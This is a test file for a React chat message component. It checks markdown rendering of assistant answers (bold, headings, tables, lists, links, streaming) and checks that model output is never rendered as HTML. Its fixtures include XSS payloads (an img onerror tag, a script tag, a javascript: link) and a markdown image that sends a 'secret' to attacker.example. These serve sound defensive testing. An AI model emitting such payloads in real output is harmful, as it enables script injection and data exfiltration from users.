import { describe, it, expect } from "vitest";
import { render, screen, within } from "@testing-library/react";

import Message, { type ChatMessage } from "@/components/Message";

// The assistant's answer is rendered as markdown (react-markdown + remark-gfm); the user's text and
// the error copy stay plain; and nothing the model writes is ever rendered as HTML.

function msg(over: Partial<ChatMessage>): ChatMessage {
  return { id: "m1", role: "assistant", content: "", citations: [], streaming: false, ...over };
}

describe("assistant answers render as markdown", () => {
  it("renders **bold** as a <strong> and leaves the figure as text", () => {
    const { container } = render(<Message message={msg({ content: "**Apple:** $416,161 million" })} />);
    const strong = container.querySelector("strong");
    expect(strong).not.toBeNull();
    expect(strong).toHaveTextContent("Apple:");
    expect(strong).toHaveClass("font-semibold");
    expect(container).toHaveTextContent("Apple: $416,161 million");
    expect(container.textContent).not.toContain("**");
  });

  it("renders ### as a heading element, not the literal hashes, at chat-bubble scale", () => {
    const { container } = render(<Message message={msg({ content: "### Financial Overview\n\nSome text." })} />);
    const heading = screen.getByRole("heading", { name: "Financial Overview" });
    expect(heading.tagName).toBe("H3");
    expect(heading).toHaveClass("text-sm", "font-bold");
    expect(container.textContent).not.toContain("###");
  });

  it("renders a markdown table with two rows as a <table>", () => {
    const table = [
      "| Company | Revenue |",
      "|---|---|",
      "| Apple | $416,161 million |",
      "| Microsoft | $281,724 million |",
    ].join("\n");
    const { container } = render(<Message message={msg({ content: table })} />);
    const el = container.querySelector("table");
    expect(el).not.toBeNull();
    expect(within(el as HTMLElement).getAllByRole("row")).toHaveLength(3); // header + two rows
    expect(within(el as HTMLElement).getByRole("cell", { name: "$281,724 million" })).toBeInTheDocument();
    expect(within(el as HTMLElement).getByRole("columnheader", { name: "Revenue" })).toHaveClass("px-2", "py-1");
  });

  it("renders bullet and numbered lists with their markers restored", () => {
    const { container } = render(<Message message={msg({ content: "- one\n- two\n\n1. first\n2. second" })} />);
    const ul = container.querySelector("ul");
    const ol = container.querySelector("ol");
    expect(ul).toHaveClass("list-disc", "pl-5");
    expect(ol).toHaveClass("list-decimal", "pl-5");
    expect(within(ul as HTMLElement).getAllByRole("listitem")).toHaveLength(2);
    expect(within(ol as HTMLElement).getAllByRole("listitem")).toHaveLength(2);
  });

  it("renders GFM strikethrough, and links open in a new tab without a referrer or opener", () => {
    const { container } = render(
      <Message message={msg({ content: "~~old~~ see [the filing](https://www.sec.gov/ixviewer)" })} />,
    );
    expect(container.querySelector("del")).toHaveTextContent("old");
    const link = screen.getByRole("link", { name: "the filing" });
    expect(link).toHaveAttribute("href", "https://www.sec.gov/ixviewer");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
    expect(link).toHaveClass("underline");
  });

  it("never renders model output as HTML: an <img onerror> is shown as text and no img exists", () => {
    const attack = "<img src=x onerror=alert(1)>";
    const { container } = render(<Message message={msg({ content: `Result ${attack} done` })} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
    expect(container.textContent).toContain(attack);
    expect(screen.getByText(/<img src=x onerror=alert\(1\)>/)).toBeInTheDocument();
  });

  it("never loads an image named in markdown syntax: the alt text is shown and no img element exists", () => {
    const { container } = render(
      <Message message={msg({ content: "See ![the chart](https://attacker.example/collect?q=secret) here" })} />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("See the chart here");
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("does not render other raw HTML either (script, iframe, inline style) and drops javascript: links", () => {
    const content = [
      "<script>alert(1)</script>",
      "",
      '<iframe src="https://example.com"></iframe>',
      "",
      '<b style="color:red">bold</b>',
      "",
      "[click](javascript:alert(1))",
    ].join("\n");
    const { container } = render(<Message message={msg({ content })} />);
    expect(container.querySelector("script, iframe, b")).toBeNull();
    expect(container.querySelector("[style]")).toBeNull();
    // react-markdown blanks the URL, and an <a href=""> would still be a live link: it must be plain text instead
    expect(screen.getByText("click").closest("a")).toBeNull();
    expect(screen.queryByRole("link", { name: "click" })).toBeNull();
    expect(container.innerHTML).not.toMatch(/javascript:/i);
  });

  it("does not strike a figure through when ~ means 'about' (single tildes are not strikethrough)", () => {
    const { container } = render(
      <Message message={msg({ content: "Revenue was ~$5B–~$7B, or (~$5B) against (~$7B), and ~~old~~ is struck" })} />,
    );
    expect(container.querySelectorAll("del")).toHaveLength(1);                 // only the real ~~old~~
    expect(container.querySelector("del")).toHaveTextContent("old");
    expect(container).toHaveTextContent("Revenue was ~$5B–~$7B, or (~$5B) against (~$7B)");
  });

  it("keeps the streaming cursor after the rendered content while streaming, and drops it when done", () => {
    const { container, rerender } = render(
      <Message message={msg({ content: "**Net** sales were", streaming: true })} />,
    );
    const cursor = container.querySelector(".animate-pulse");
    expect(cursor).not.toBeNull();
    const text = container.querySelector("p") as HTMLElement;
    expect(text.compareDocumentPosition(cursor as Element) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    expect(container.querySelector("strong")).toHaveTextContent("Net");        // partial markdown renders as it streams
    rerender(<Message message={msg({ content: "**Net** sales were $416,161 million.", streaming: false })} />);
    expect(container.querySelector(".animate-pulse")).toBeNull();
  });

  it("copes with half-written markdown while streaming (an unclosed ** and an unfinished table)", () => {
    const { container } = render(
      <Message message={msg({ content: "Revenue was **$416,161 mi\n\n| a | b |\n|---", streaming: true })} />,
    );
    expect(container).toHaveTextContent("Revenue was");
    expect(container.querySelector("img, script")).toBeNull();
  });
});

describe("what stays plain", () => {
  it("shows a user message with literal asterisks and no markup", () => {
    const { container } = render(<Message message={msg({ role: "user", content: "**x**" })} />);
    expect(screen.getByText("**x**")).toBeInTheDocument();
    expect(container.querySelector("strong")).toBeNull();
    expect(container.querySelector("p")).toHaveClass("whitespace-pre-wrap");
  });

  it("shows the error copy as plain text, markdown characters included", () => {
    const { container } = render(<Message message={msg({ content: "partial", error: "Failed: **x** <b>y</b>" })} />);
    expect(screen.getByText("Failed: **x** <b>y</b>")).toHaveClass("text-red-600");
    expect(container.querySelector("strong, b")).toBeNull();
  });

  it("still shows the loading dots before the first token", () => {
    render(<Message message={msg({ content: "", streaming: true })} />);
    expect(screen.getByLabelText("Assistant is thinking")).toBeInTheDocument();
  });
});
